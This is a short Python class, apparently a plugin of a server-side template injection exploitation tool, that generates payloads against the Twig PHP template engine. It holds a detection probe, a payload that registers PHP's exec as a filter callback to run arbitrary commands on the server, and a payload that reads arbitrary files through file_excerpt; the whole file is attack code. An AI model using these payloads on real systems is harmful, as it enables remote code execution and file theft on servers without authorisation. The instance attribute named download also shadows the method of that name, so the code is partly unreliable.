class twig:
    def __init__(self):
        self.name = "twig"
        self.exec = True
        self.download = True

    def payload_test(self):
        return ["{{347*'21'}}"]

    def execu(self,cmd,index=-1):
        payload = [
        '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("'+cmd+'")}}'
        ]
        if index >= 0:
            return payload[index]
        return payload

    def download(self,cmd,index=-1):
        payload = [
        "\"{{'"+cmd+"'|file_excerpt(1,30)}}\"@"
        ]
        if index >= 0:
            return payload[index]
        return payload
